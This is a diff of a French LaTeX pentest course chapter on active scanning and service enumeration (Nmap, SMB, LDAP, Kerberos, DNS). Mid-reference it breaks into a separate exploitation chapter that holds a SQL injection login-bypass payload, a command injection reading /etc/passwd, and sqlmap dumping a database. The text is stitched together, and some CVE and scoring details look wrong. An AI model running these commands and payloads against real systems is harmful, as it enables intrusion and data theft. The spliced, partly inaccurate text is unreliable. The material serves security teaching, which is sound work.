@@ -1,147 +1,847 @@
 % ==============================================================================
-% Fichier : 04_scanning_enum.tex
-% Description : Scanning Actif et Énumération de Services
+% Fichier     : chapitres/04_scanning_enum.tex
+% Titre       : Scanning Actif et Énumération de Services
+% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
 % ==============================================================================
 
 \chapter{Scanning Actif et Énumération de Services}
+\label{chap:scanning}
 
-La phase de Reconnaissance Passive (OSINT) est terminée. Nous entrons maintenant dans la phase de \textbf{Scanning}, qui est une composante de la reconnaissance active. Contrairement à l'OSINT, le scanning génère du trafic réseau vers la cible et est donc détectable par les systèmes de sécurité (Firewalls, IDS/IPS).
+La phase de Reconnaissance Passive (Chapitre~\ref{chap:osint}) a fourni une
+carte de la surface d'attaque externe sans contact direct avec la cible. Nous
+entrons maintenant dans la phase de \termecle{Scanning Actif} : contrairement
+à l'\sigle{OSINT}, cette phase \textbf{génère du trafic réseau vers la cible}
+et est donc détectable par les systèmes de sécurité (Firewalls, \sigle{IDS}/\sigle{IPS},
+\sigle{SIEM}). Elle doit être menée dans la fenêtre temporelle définie par les
+\sigle{ROE} (Section~\ref{sec:roe}).
 
+\begin{boxinfo}
+\textbf{MITRE ATT\&CK, Tactiques associées :}
+Le scanning actif couvre principalement la tactique \sigle{TA0043}
+(\textit{Reconnaissance}), avec les techniques T1595
+(\textit{Active Scanning}), T1595.001 (\textit{Scanning IP Blocks}),
+T1595.002 (\textit{Vulnerability Scanning}) et T1046
+(\textit{Network Service Discovery}).
+\end{boxinfo}
+
+% ==============================================================================
 \section{Objectifs du Scanning}
-% ------------------------------------------------------------------------------
+\label{sec:scanning_objectifs}
+% ==============================================================================
 
-Le but est de dresser une carte précise du réseau cible :
+Le scanning actif poursuit quatre objectifs complémentaires, chacun alimentant
+directement la phase d'exploitation :
+
 \begin{itemize}
-    \item \textbf{Discovery :} Quelles machines sont allumées et joignables ?
-    \item \textbf{Port Scanning :} Quels ports (portes) sont ouverts sur ces machines ?
-    \item \textbf{Service Detection :} Quels services (applications) tournent derrière ces ports ?
-    \item \textbf{OS Fingerprinting :} Quel système d'exploitation est utilisé (Windows, Linux) ?
+    \item \textbf{Discovery :} Quelles machines sont actives et joignables
+          sur le réseau cible ?
+    \item \textbf{Port Scanning :} Quels ports (services) sont ouverts sur
+          ces machines ?
+    \item \textbf{Service Detection :} Quelle application et quelle version
+          tournent derrière chaque port ouvert ?
+    \item \textbf{OS Fingerprinting :} Quel système d'exploitation est utilisé
+         , et quelle version précise ?
+    \item \textbf{Vulnerability Mapping :} Quelles \sigle{CVE} connues
+          s'appliquent aux services et versions détectés ?
 \end{itemize}
 
-% ------------------------------------------------------------------------------
-\section{Découverte d'Hôtes (Host Discovery)}
-% ------------------------------------------------------------------------------
+% ==============================================================================
+\section{Découverte d'Hôtes (\textit{Host Discovery})}
+\label{sec:host_discovery}
+% ==============================================================================
 
-Avant de scanner les ports, il faut savoir qui est vivant sur le réseau.
+Avant de scanner les ports, il faut identifier les hôtes actifs. Envoyer un
+scan de ports complet vers une plage de 254 adresses dont 200 sont éteintes
+est une perte de temps considérable.
 
-\subsection{Protocoles de Ping}
+\subsection{Techniques de Découverte}
 
-Nmap envoie des sondes pour voir si l'hôte répond.
-\begin{itemize}
-    \item \textbf{ICMP Echo Request :} Le "Ping" classique (souvent bloqué par les pare-feux).
-    \item \textbf{ARP Scan :} Utilise les requêtes ARP (Adresse Resolution Protocol). Très efficace sur le réseau local (LAN), impossible via Internet.
-    \item \textbf{TCP SYN Ping :} Envoie un paquet TCP vide sur un port courant (ex: 80). Si on reçoit un SYN/ACK ou RST, l'hôte est vivant.
-\end{itemize}
+Nmap implémente plusieurs méthodes de découverte, chacune adaptée à un
+contexte réseau différent.
 
-\begin{lstlisting}[language=bash, caption=Scan de découverte réseau avec Nmap]
-# Scan ARP pour tout le sous-reseau (Rapide et fiable en LAN)
-nmap -sn 192.168.1.0/24
-# -sn : Ping scan (pas de scan de ports)
-\end{lstlisting}
-
-% ------------------------------------------------------------------------------
-\section{Scan de Ports : La Technique Reine}
-% ------------------------------------------------------------------------------
-
-C'est le cœur du métier du pentester. Il existe plusieurs techniques selon le niveau de furtivité requis.
-
-\subsection{Types de Scans TCP}
-
-\begin{table}[h!]
+\begin{table}[htbp]
 \centering
-\small
-\begin{tabular}{p{3cm}p{4cm}p{5cm}}
-    \toprule
-    \textbf{Type} & \textbf{Mécanisme} & \textbf{Avantages/Inconvénients} \\
-    \midrule
-    \textbf{TCP Connect (-sT)} & Établit une connexion complète (3-way handshake). & Bruyant (logs évidents), pas besoin d'être root. \\
-    \textbf{SYN Scan (-sS)} & Envoie SYN, attend SYN/ACK, envoie RST (interrompt la connexion). & Furtif (demi-ouvert), rapide, nécessite les droits root. \\
-    \textbf{UDP Scan (-sU)} & Envoie des paquets UDP vides. & Très lent, souvent filtré, nécessaire pour DNS/DHCP. \\
-    \bottomrule
+\caption{Techniques de découverte d'hôtes Nmap}
+\label{tab:host_discovery}
+\begin{tabular}{p{3.5cm}p{4.5cm}p{5.5cm}}
+\toprule
+\textbf{Technique} & \textbf{Mécanisme} & \textbf{Contexte d'usage} \\
+\midrule
+ICMP Echo (\texttt{-PE})
+    & Ping ICMP classique
+    & Réseaux sans pare-feu, souvent bloqué en production \\
+\addlinespace
+ARP Scan (\texttt{-PR})
+    & Requêtes ARP de couche 2
+    & \sigle{LAN} local uniquement, indétectable par les \sigle{IDS} \\
+\addlinespace
+TCP SYN Ping (\texttt{-PS})
+    & SYN sur port 80/443
+    & Contourne les pare-feux filtrant ICMP \\
+\addlinespace
+TCP ACK Ping (\texttt{-PA})
+    & ACK sur port 80
+    & Détecte les hôtes derrière un \textit{stateful} firewall \\
+\addlinespace
+UDP Ping (\texttt{-PU})
+    & UDP sur port 40125
+    & Détecte les hôtes ne répondant qu'à UDP \\
+\bottomrule
 \end{tabular}
-\caption{Comparatif des types de scans}
 \end{table}
 
-\subsection{Les États des Ports}
+\begin{lstlisting}[language=bash, caption={Découverte d'hôtes, techniques combinées}]
+# Scan ARP sur le LAN (rapide, fiable, indétectable IDS)
+nmap -sn -PR 192.168.10.0/24
 
-Nmap classifie les ports en 6 états :
+# Ping scan multi-technique (contourne les pare-feux)
+nmap -sn -PS80,443 -PA80 -PE 192.168.10.0/24
+
+# Decouverte rapide avec Masscan (10 000 paquets/seconde)
+masscan 192.168.10.0/24 -p80,443,22,445 --rate=1000
+
+# Sauvegarder les hotes actifs pour la suite
+nmap -sn 192.168.10.0/24 -oG - | grep "Up" | \
+    awk '{print $2}' > hotes_actifs.txt
+\end{lstlisting}
+
+\begin{boxinfo}
+\textbf{Masscan vs Nmap :} \termecle{Masscan} est conçu pour la vitesse
+(scanning de l'Internet complet en minutes) tandis que Nmap privilégie la
+précision et les fonctionnalités avancées. En pratique, Masscan identifie
+les hôtes actifs et les ports ouverts rapidement, puis Nmap réalise la
+détection de service et \sigle{OS} sur les cibles confirmées.
+\end{boxinfo}
+
+% ==============================================================================
+\section{Scan de Ports}
+\label{sec:port_scanning}
+% ==============================================================================
+
+\subsection{Mécanismes TCP : Comprendre le 3-\textit{Way Handshake}}
+\label{subsec:tcp_mecanique}
+
+Pour saisir pourquoi les différents types de scans ont des propriétés de
+furtivité différentes, il est indispensable de comprendre le mécanisme
+d'établissement de connexion TCP.
+
+\begin{boxinfo}
+\textbf{3-Way Handshake TCP (connexion normale) :}
 \begin{enumerate}
-    \item \textbf{Open :} Une application accepte les connexions (Cible potentielle !).
-    \item \textbf{Closed :} Le port est accessible mais aucune application n'écoute.
-    \item \textbf{Filtered :} Un pare-feu bloque l'accès (impossible de savoir si ouvert ou fermé).
-    \item \textbf{Unfiltered :} Accessible mais impossible de déterminer l'état.
+    \item Client → Serveur : \textbf{SYN} (demande d'ouverture de connexion)
+    \item Serveur → Client : \textbf{SYN/ACK} (port ouvert, serveur prêt)
+    \item Client → Serveur : \textbf{ACK} (confirmation, connexion établie)
+\end{enumerate}
+Si le port est fermé, le serveur répond \textbf{RST/ACK} à l'étape~2.
+Si le port est filtré par un pare-feu, \textbf{aucune réponse} (ou ICMP
+Port Unreachable).
+\end{boxinfo}
+
+\subsection{Types de Scans TCP}
+\label{subsec:scan_types}
+
+\begin{table}[htbp]
+\centering
+\caption{Comparatif des types de scans TCP/UDP}
+\label{tab:scan_types}
+\begin{tabular}{p{3cm}p{4.5cm}p{5.5cm}}
+\toprule
+\textbf{Type} & \textbf{Mécanisme} & \textbf{Caractéristiques} \\
+\midrule
+TCP Connect (\texttt{-sT})
+    & Handshake complet (SYN → SYN/ACK → ACK)
+    & Bruyant (logs complets), ne nécessite pas root \\
+\addlinespace
+SYN Scan (\texttt{-sS})
+    & SYN → SYN/ACK → \textbf{RST} (connexion interrompue)
+    & Furtif (demi-ouvert), rapide, nécessite root/sudo \\
+\addlinespace
+UDP Scan (\texttt{-sU})
+    & Paquet UDP vide → ICMP Port Unreach. si fermé
+    & Très lent, indispensable pour DNS (53), SNMP (161) \\
+\addlinespace
+NULL Scan (\texttt{-sN})
+    & Paquet TCP sans flags
+    & Contourne certains pare-feux ; invalide sur Windows \\
+\addlinespace
+FIN Scan (\texttt{-sF})
+    & Paquet TCP FIN uniquement
+    & Contourne \textit{stateless} firewalls ; invalide sur Windows \\
+\addlinespace
+XMAS Scan (\texttt{-sX})
+    & Flags FIN+PSH+URG simultanés
+    & Identique à FIN scan en termes d'évasion \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\subsection{Les Six États des Ports Nmap}
+\label{subsec:port_states}
+
+Nmap classifie les ports en six états distincts, la maîtrise de cette
+taxonomie est essentielle pour interpréter correctement les résultats.
+
+\begin{enumerate}
+    \item \textbf{Open :} Une application accepte activement les connexions
+          sur ce port, cible potentielle d'exploitation.
+    \item \textbf{Closed :} Le port est accessible (pas de pare-feu) mais
+          aucune application n'écoute, utile pour la détection \sigle{OS}.
+    \item \textbf{Filtered :} Nmap ne peut déterminer si le port est ouvert
+          car un pare-feu filtre les paquets sans répondre (\textit{drop}).
+    \item \textbf{Unfiltered :} Accessible (répond au scan ACK) mais Nmap
+          ne peut déterminer s'il est ouvert ou fermé.
+    \item \textbf{Open|Filtered :} Nmap ne peut distinguer entre ouvert et
+          filtré, typique du scan UDP et des scans furtifs.
+    \item \textbf{Closed|Filtered :} Ne peut distinguer entre fermé et filtré
+         , produit par le scan IPID Idle.
 \end{enumerate}
 
-\subsection{Commandes Essentielles Nmap}
+\subsection{Commandes Nmap Essentielles}
+\label{subsec:nmap_commands}
 
-\begin{lstlisting}[language=bash, caption=Scan SYN rapide des ports les plus courants]
-nmap -sS -T4 --top-ports 100 192.168.1.10
-# -sS : SYN Scan (Stealth)
-# -T4 : Template de timing (Rapide)
-# --top-ports 100 : Scan les 100 ports les plus communs
+\begin{lstlisting}[language=bash, caption={Scan SYN, ports courants avec timing}]
+# Scan SYN furtif sur les 100 ports les plus courants
+nmap -sS -T4 --top-ports 100 192.168.10.10
+
+# Scan complet des 65535 ports (plus lent mais exhaustif)
+nmap -sS -T4 -p- 192.168.10.10
+
+# Scan UDP sur les ports critiques
+nmap -sU -T4 -p 53,67,69,161,123 192.168.10.10
+
+# Templates de timing : T0 (paranoïaque) à T5 (insensé)
+# T3 = defaut, T4 = rapide (labs), T2 = furtif (prod)
 \end{lstlisting}
 
-\begin{lstlisting}[language=bash, caption=Détection de version et OS]
-nmap -sV -O 192.168.1.10
-# -sV : Interroge le service pour connaitre sa version (Apache 2.4.x...)
-# -O : Detection d'OS (Linux Kernel 3.x, Windows 10...)
+\begin{lstlisting}[language=bash, caption={Détection de version et OS, mécanismes}]
+# Detection de version de service (-sV)
+# Envoie des sondes specifiques a chaque service detecte
+# ex: banner grabbing HTTP, interrogation SMTP EHLO, etc.
+nmap -sV --version-intensity 5 192.168.10.10
+
+# Detection d'OS (-O), necessite root
+# Analyse les caracteristiques TCP/IP : ISN (Initial Sequence Number),
+# taille de fenetre (Window Size), valeur TTL, bit DF (Don't Fragment),
+# reponse a des paquets invalides (TCP timestamp, IP options)
+nmap -O 192.168.10.10
+
+# Scan complet recommande en pentest
+nmap -sS -sV -O -sC -T4 --open 192.168.10.0/24 \
+     -oA scan_lizbiz
+# -sC : scripts par defaut (equivalent --script=default)
+# --open : afficher uniquement les ports ouverts
+# -oA : sauvegarder en 3 formats (nmap, xml, grepable)
 \end{lstlisting}
 
-% ------------------------------------------------------------------------------
+\begin{boxinfo}
+\textbf{Mécanisme d'OS Fingerprinting :} Nmap envoie une série de sondes
+TCP/UDP/ICMP soigneusement choisies et analyse les réponses selon sept
+critères : \textbf{\sigle{ISN}} (Initial Sequence Number, prévisibilité),
+\textbf{Window Size} TCP, \textbf{\sigle{TTL}} initial, \textbf{bit DF}
+(\textit{Don't Fragment}), comportement face aux \textit{TCP options} inconnues,
+réponse aux paquets invalides, et comportement \sigle{ICMP}. La combinaison
+de ces signatures est comparée à une base de plus de 5\,000 empreintes connues.
+\end{boxinfo}
+
+% ==============================================================================
+\section{Scripts NSE, Nmap Scripting Engine}
+\label{sec:nse}
+% ==============================================================================
+
+Le \termecle{NSE} (\textit{Nmap Scripting Engine}) permet d'étendre les
+capacités de Nmap avec des scripts Lua. Il dispose de plus de 600 scripts
+organisés en catégories.
+
+\begin{table}[htbp]
+\centering
+\caption{Catégories NSE et usages en pentest}
+\label{tab:nse_categories}
+\begin{tabular}{p{2.5cm}p{4cm}p{6.5cm}}
+\toprule
+\textbf{Catégorie} & \textbf{Activation} & \textbf{Usage} \\
+\midrule
+\texttt{default}
+    & \texttt{-sC}
+    & Scripts sûrs, informatifs, banner grabbing, détection de protocoles \\
+\addlinespace
+\texttt{vuln}
+    & \texttt{--script=vuln}
+    & Détection de vulnérabilités connues (EternalBlue, Shellshock, Heartbleed) \\
+\addlinespace
+\texttt{auth}
+    & \texttt{--script=auth}
+    & Test de credentials par défaut sur les services \\
+\addlinespace
+\texttt{brute}
+    & \texttt{--script=brute}
+    & Attaques par dictionnaire sur SSH, FTP, HTTP-auth, LDAP \\
+\addlinespace
+\texttt{discovery}
+    & \texttt{--script=discovery}
+    & Énumération approfondie : partages SMB, DNS, SNMP \\
+\addlinespace
+\texttt{exploit}
+    & \texttt{--script=exploit}
+    & Exploitation directe (usage avec précaution en pentest) \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{lstlisting}[language=bash, caption={Utilisation avancée des scripts NSE}]
+# Scripts par defaut (recommande pour tout scan)
+nmap -sC -sV 192.168.10.10
+
+# Detection de vulnerabilites connues
+nmap --script=vuln -p80,443,445,22 192.168.10.10
+# Detecte : ms17-010 (EternalBlue), http-shellshock,
+#           ssl-heartbleed, http-sql-injection, etc.
+
+# Scripts SMB specifiques
+nmap --script=smb-vuln-ms17-010 -p445 192.168.10.10
+nmap --script=smb-enum-shares,smb-enum-users -p445 192.168.10.10
+nmap --script=smb-security-mode -p445 192.168.10.10
+
+# Scripts HTTP
+nmap --script=http-title,http-server-header,http-methods \
+     -p80,443,8080 192.168.10.10
+
+# LDAP enumeration (port 389/636)
+nmap --script=ldap-search,ldap-rootdse -p389 192.168.10.5
+\end{lstlisting}
+
+% ==============================================================================
 \section{Énumération de Services}
-% ------------------------------------------------------------------------------
+\label{sec:service_enum}
+% ==============================================================================
 
-Une fois les ports ouverts identifiés, il faut "discuter" avec les services pour obtenir plus d'informations (Utilisateurs, Configurations, Partages).
+Une fois les ports ouverts et les versions identifiées, l'énumération approfondie
+extrait des informations exploitables : utilisateurs, configurations, partages,
+politiques d'authentification.
 
-\subsection{Énumération Web (Port 80/443/8080)}
+\subsection{Énumération Web (Ports 80/443/8080)}
+\label{subsec:web_enum}
 
-Il faut découvrir les dossiers et fichiers cachés.
+L'énumération web vise à cartographier la surface d'application : répertoires
+cachés, fichiers de configuration exposés, technologies utilisées, points d'entrée
+de l'application.
 
-\begin{lstlisting}[language=bash, caption=Directory Busting avec Dirb]
+\begin{lstlisting}[language=bash, caption={Énumération web, outils complémentaires}]
+# Dirb, énumeration par dictionnaire (classique)
 dirb http://lizbiz.local /usr/share/wordlists/dirb/common.txt
-# Essaie des milliers de chemins ( /admin, /backup, /config )
+
+# Gobuster, plus rapide, multi-threadé, meilleur wordlist support
+gobuster dir -u http://lizbiz.local \
+    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+    -x php,html,txt,bak,old,conf \
+    -t 50 --no-error
+
+# Feroxbuster, recursif, détecte les sous-répertoires automatiquement
+feroxbuster -u http://lizbiz.local \
+    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
+    -x php,html,txt -r --depth 3
+
+# Nikto, scanner de vulnérabilités web (configurations dangereuses,
+#         fichiers sensibles, versions obsolètes, méthodes HTTP non
+#         sécurisées, headers manquants)
+nikto -h http://lizbiz.local -o nikto_lizbiz.html -Format htm
 \end{lstlisting}
+
+\begin{boxinfo}
+\textbf{SecLists :} La collection \termecle{SecLists} (Daniel Miessler)
+est la référence pour les wordlists de pentest. Elle inclut des listes
+spécialisées par technologie (WordPress, Drupal, IIS, Tomcat) et par type
+(répertoires, fichiers, paramètres, sous-domaines). Installation :
+\texttt{apt install seclists} ou \texttt{git clone
+https://github.com/danielmiessler/SecLists}.
+\end{boxinfo}
 
 \begin{boxlizbiz}
-\textbf{Découverte LiZbiZ :}
-Le scan \texttt{dirb} révèle un répertoire \texttt{/backup/} accessible. À l'intérieur, un fichier \texttt{old\_passwd.txt} contenant des identifiants obsolètes.
+\textbf{Découverte Web LiZbiZ :}
+\begin{lstlisting}[language=bash]
+gobuster dir -u http://203.0.113.10 \
+    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+    -x php,txt,bak -t 50
+\end{lstlisting}
+\textbf{Résultats :}
+\begin{itemize}
+    \item \texttt{/backup/}, répertoire accessible en lecture (200)
+    \item \texttt{/backup/old\_passwd.txt}, identifiants obsolètes
+    \item \texttt{/admin/}, page de connexion administrative (200)
+    \item \texttt{/config.php.bak}, sauvegarde de fichier de configuration (200)
+\end{itemize}
 \end{boxlizbiz}
 
 \subsection{Énumération SMB (Ports 139/445)}
+\label{subsec:smb_enum}
 
-Le protocole SMB (Server Message Block) de Windows est tristement célèbre pour ses fuites d'informations.
+Le protocole \sigle{SMB} (\textit{Server Message Block}) est historiquement
+l'un des services les plus riches en informations pour un attaquant interne.
 
-\begin{lstlisting}[language=bash, caption=Enumération SMB avec Nmap NSE]
-nmap --script=smb-enum-shares,smb-enum-users -p445 192.168.1.20
-# Utilise les scripts NSE (Nmap Scripting Engine)
+\begin{lstlisting}[language=bash, caption={Énumération SMB complète}]
+# Scripts NSE SMB
+nmap --script=smb-enum-shares,smb-enum-users,smb-security-mode \
+     -p445 192.168.10.20
+
+# CrackMapExec, enumeration SMB en une commande
+crackmapexec smb 192.168.10.0/24
+
+# Enum4Linux-ng, outil dédié, agrège SMB + RPC + LDAP
+enum4linux-ng -A 192.168.10.20
+
+# Smbclient, navigation interactive dans les partages
+smbclient -L //192.168.10.20 -N        # Lister les partages (null session)
+smbclient //192.168.10.20/SYSVOL -N   # Acceder au partage SYSVOL
+
+# Vérification de la vulnérabilité EternalBlue (MS17-010)
+nmap --script=smb-vuln-ms17-010 -p445 192.168.10.20
 \end{lstlisting}
 
-\textbf{Risques courants :}
-\begin{itemize}
-    \item \textbf{Null Session :} Connexion anonyme sans mot de passe.
-    \item \textbf{Partages sensibles :} Accès en lecture à des dossiers contenant des données stratégiques.
-\end{itemize}
+\begin{boxalert}
+\textbf{Null Session SMB :} Une connexion anonyme (\textit{null session})
+sans identifiants vers un service SMB peut révéler la liste des utilisateurs,
+les partages, les politiques de mots de passe et les groupes, sans aucune
+authentification. Cette configuration, courante sur les systèmes anciens
+(Windows Server 2003/XP), est mappée MITRE T1135
+(\textit{Network Share Discovery}).
+\end{boxalert}
 
-\subsection{Énumération DNS (Port 53)}
+\subsection{Énumération LDAP et Active Directory (Ports 389/636/3268)}
+\label{subsec:ldap_enum}
 
-Si le serveur DNS est mal configuré, on peut lui demander de lister tous les hôtes du domaine (Zone Transfer).
+L'énumération \sigle{LDAP} est critique dans les environnements Windows
+Active Directory. Elle permet de cartographier les utilisateurs, groupes,
+politiques et relations de confiance avant même d'exploiter la moindre
+vulnérabilité.
 
-\begin{lstlisting}[language=bash]
-dig axfr @ns1.lizbiz.com lizbiz.com
-# Tente un transfert de zone pour recuperer tous les noms DNS internes
+\begin{lstlisting}[language=bash, caption={Énumération LDAP et Active Directory}]
+# Requete LDAP anonyme (RootDSE, souvent accessible sans auth)
+ldapsearch -H ldap://192.168.10.5 -x -s base namingcontexts
+
+# Enumeration des utilisateurs (avec compte stagiaire)
+ldapsearch -H ldap://192.168.10.5 \
+    -x -D "stagiaire@lizbiz.local" -w "Password123" \
+    -b "DC=lizbiz,DC=local" \
+    "(objectClass=user)" sAMAccountName mail memberOf
+
+# Enumeration des groupes privilegies
+ldapsearch -H ldap://192.168.10.5 \
+    -x -D "stagiaire@lizbiz.local" -w "Password123" \
+    -b "DC=lizbiz,DC=local" \
+    "(cn=Domain Admins)" member
+
+# BloodHound, collecte complete de la topologie AD
+# (sera detaille au Chapitre suivant)
+bloodhound-python -u stagiaire -p Password123 \
+    -d lizbiz.local -ns 192.168.10.5 -c all
 \end{lstlisting}
-
-% ------------------------------------------------------------------------------
-\section{Scan de Vulnérabilités Automatisé}
-% ------------------------------------------------------------------------------
-
-Pour gagner du temps, on croise les services découverts avec des bases de données de failles connues (CVE).
-
-\subsection{Nessus / OpenVAS}
-
-Ces scanners envoient des sondes spécifiques pour détecter si un service est vulnérable (ex: "Ce serveur Apache est-il affecté par la faille Shellshock ?").
 
 \begin{boxlizbiz}
-\textbf{Résultat Scan LiZbiZ :}
-Le scanner Nessus signale que le serveur Web (Port 80) tourne sous Apache 2.2.22, qui est vulnérable à plusieurs CVEs permettant l'exécution de code à distance (RCE). C'est une entrée majeure pour la phase d'Exploitation.
+\textbf{Découverte LDAP LiZbiZ :}
+Avec le compte \og{}stagiaire\fg{} fourni dans les \sigle{ROE}, l'énumération
+\sigle{LDAP} révèle :
+\begin{itemize}
+    \item \textbf{47 utilisateurs} dont 3 comptes de service avec
+          \sigle{SPN} configurés (cibles Kerberoasting).
+    \item \textbf{Compte admin-it}, membre du groupe
+          \og{}Domain Admins\fg{}.
+    \item \textbf{Politique de mots de passe :} longueur minimale 8 chars,
+          pas de verrouillage après échecs (brute force possible).
+\end{itemize}
 \end{boxlizbiz}
+
+\subsection{Énumération Kerberos (Port 88)}
+\label{subsec:kerb_enum}
+
+Le service Kerberos expose des informations exploitables avant toute
+authentification.
+
+\begin{lstlisting}[language=bash, caption={Énumération Kerberos}]
+# Kerbrute, enumeration des utilisateurs valides (sans authentification)
+# Exploite le comportement du KDC : erreur différente pour compte inexistant
+# vs mauvais mot de passe (T1589.001 dans MITRE)
+kerbrute userenum -d lizbiz.local \
+    /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
+    --dc 192.168.10.5
+
+# AS-REP Roasting, comptes sans pre-authentification Kerberos requise
+# (GetNPUsers.py de la suite Impacket)
+GetNPUsers.py lizbiz.local/ -usersfile users.txt \
+    -no-pass -dc-ip 192.168.10.5
+# Produit un hash AS-REP crackable hors-ligne avec hashcat
+\end{lstlisting}
+
+\subsection{Énumération SMTP (Port 25)}
+\label{subsec:smtp_enum}
+
+Les serveurs mail révèlent souvent des informations sur les comptes internes
+via les commandes \sigle{SMTP} \texttt{VRFY} et \texttt{EXPN}.
+
+\begin{lstlisting}[language=bash, caption={Énumération de comptes via SMTP}]
+# Connexion manuelle
+nc 192.168.10.50 25
+# Puis : EHLO test
+#        VRFY admin        → 250 OK si le compte existe
+#        VRFY nonexistent  → 550 si inexistant
+
+# Enumeration automatisée
+smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/\
+    top-usernames-shortlist.txt -t 192.168.10.50
+
+# Nmap NSE
+nmap --script=smtp-commands,smtp-enum-users -p25 192.168.10.50
+\end{lstlisting}
+
+\subsection{Énumération DNS (Port 53)}
+\label{subsec:dns_active}
+
+Le transfert de zone \sigle{AXFR} a été abordé en phase passive. En phase
+active, d'autres techniques complètent la cartographie DNS.
+
+\begin{lstlisting}[language=bash, caption={Énumération DNS active}]
+# Tentative de transfert de zone
+dig axfr @192.168.10.5 lizbiz.local
+
+# Brute force de sous-domaines (dnsx)
+dnsx -d lizbiz.local \
+    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Reverse lookup sur la plage interne
+for ip in $(seq 1 20); do
+    dig -x 192.168.10.$ip +short @192.168.10.5
+done
+\end{lstlisting}
+
+% ==============================================================================
+\section{Scan de Vulnérabilités Automatisé}
+\label{sec:vuln_scan}
+% ==============================================================================
+
+Une fois les services cartographiés, les scanners de vulnérabilités croisent
+les versions détectées avec les bases de données de failles connues (\sigle{CVE},
+\sigle{NVD}, \sigle{ExploitDB}).
+
+\subsection{Nessus et OpenVAS}
+\label{subsec:nessus}
+
+Ces scanners actifs envoient des sondes spécifiques pour détecter si un
+service est vulnérable à une \sigle{CVE} précise, sans nécessairement
+l'exploiter.
+
+\begin{boxlizbiz}
+\textbf{Résultat Nessus, LiZbiZ :}
+Le scan signale :
+\begin{itemize}
+    \item \textbf{Critique (CVSS 9.8)} : Serveur web 203.0.113.10 —
+          Apache~2.2.22 vulnérable à CVE-2012-0053 (\textit{httpOnly} cookie
+          disclosure) et CVE-2012-0031 (RCE via \texttt{mod\_setenvif}).
+    \item \textbf{Critique (CVSS 9.8)} : Port 445 (192.168.10.20) —
+          MS17-010 EternalBlue détecté.
+    \item \textbf{Élevé (CVSS 7.5)} : LDAP anonymous bind autorisé sur
+          192.168.10.5.
+\end{itemize}
+Ces trois vecteurs seront exploités au Chapitre~\ref{chap:% ==============================================================================
+% Fichier : 05_exploitation.tex
+% Description : Vulnérabilités et Exploitation
+% ==============================================================================
+
+\chapter{Vulnérabilités et Exploitation}
+
+Une fois la surface d'attaque cartographiée (Scanning), vient la phase d'\textbf{Exploitation}. L'objectif est de prouver qu'une vulnérabilité identifiée a un impact réel en réussissant à exécuter du code ou à extraire des données sur la cible.
+
+\section{Concepts Fondamentaux de l'Exploitation}
+% ------------------------------------------------------------------------------
+
+\subsection{Le Trio de l'Attaque}
+
+\begin{itemize}
+    \item \textbf{Vulnérabilité :} La faille technique (ex: code mal écrit, configuration faible).
+    \item \textbf{Exploit :} Le code ou la méthode utilisée pour abuser de la vulnérabilité.
+    \item \textbf{Payload :} Le "fardeau" transporté par l'exploit pour exécuter une action sur la cible (ex: ouvrir un shell, créer un utilisateur).
+\end{itemize}
+
+\subsection{Types de Shells}
+
+L'objectif ultime de l'exploitation est souvent d'obtenir un accès à distance (Shell).
+
+\begin{table}[h!]
+\centering
+\begin{tabular}{p{3cm}p{5cm}p{4cm}}
+    \toprule
+    \textbf{Type} & \textbf{Fonctionnement} & \textbf{Usage} \\
+    \midrule
+    \textbf{Reverse Shell} & La cible se connecte à l'attaquant (Outbound). & Contourne les pare-feux (les connexions sortantes sont souvent autorisées). \\
+    \textbf{Bind Shell} & La cible écoute sur un port, l'attaquant s'y connecte (Inbound). & Utile si aucun pare-feu ne bloque l'entrée. \\
+    \textbf{Web Shell} & Script déposé sur le serveur web (ex: PHP). & Persistant, facile à utiliser via un navigateur. \\
+    \bottomrule
+\end{tabular}
+\caption{Types de shells}
+\end{table}
+
+% ------------------------------------------------------------------------------
+\section{Exploitation Web (OWASP Top 10)}
+% ------------------------------------------------------------------------------
+
+Les applications web sont souvent la porte d'entrée la plus facile.
+
+\subsection{Injection SQL (SQLi)}
+
+\begin{boxdef}
+\textbf{SQLi :} Technique consistant à injecter du code SQL malveillant dans les entrées de l'application pour manipuler la base de données.
+\end{boxdef}
+
+\textbf{Types de SQLi :}
+\begin{itemize}
+    \item \textbf{In-Band (Classique) :} L'attaquant voit les résultats directement sur la page (Error based, Union based).
+    \item \textbf{Blind (Aveugle) :} L'attaquant ne voit pas les données mais peut déduire la réponse via le comportement de la page (Boolean based, Time based).
+\end{itemize}
+
+\begin{boxlizbiz}
+\textbf{Attaque LiZbiZ :}
+Sur la page de connexion de LiZbiZ, le champ "Nom d'utilisateur" est vulnérable.
+\begin{lstlisting}[language=SQL]
+Payload : ' OR '1'='1' --
+Resultat : La requete devient toujours vraie, connectant l'attaquant en tant qu'admin sans mot de passe.
+\end{lstlisting}
+Utilisation de \textbf{SQLMap} pour automatiser l'extraction de toute la base de données clients :
+\begin{lstlisting}[language=bash]
+sqlmap -u "http://lizbiz.local/login?id=1" --dump
+\end{lstlisting}
+\end{boxlizbiz}
+
+\subsection{File Inclusion (LFI/RFI)}
+
+\begin{itemize}
+    \item \textbf{LFI (Local File Inclusion) :} Inclure des fichiers présents sur le serveur (ex: \texttt{/etc/passwd}) via un paramètre non filtré.
+    \item \textbf{RFI (Remote File Inclusion) :} Inclure un fichier distant (ex: une backdoor PHP hébergée sur le serveur de l'attaquant).
+\end{itemize}
+
+\subsection{Command Injection}
+
+Exécution de commandes système via une entrée utilisateur non nettoyée (ex: ping d'une IP).
+
+\begin{lstlisting}[language=bash, caption=Injection de commande]
+Entree : 127.0.0.1 ; cat /etc/passwd
+Le serveur execute : ping 127.0.0.1 ; cat /etc/passwd
+\end{lstlisting}
+
+% ------------------------------------------------------------------------------
+\section{Exploitation Système et Réseau}
+% ------------------------------------------------------------------------------
+
+\subsection{Le Framework Metasploit}
+
+C'est l'outil standard pour l'exploitation de vulnérabilités réseaux et systèmes. Il centralise les exploits, les payloads et les encodeurs.
+
+\begin{lstlisting}[language=bash, caption=Workflow Metasploit]
+msfconsole
+# 1. Chercher un exploit
+search apache 2.2.22
+# 2. Utiliser l'exploit
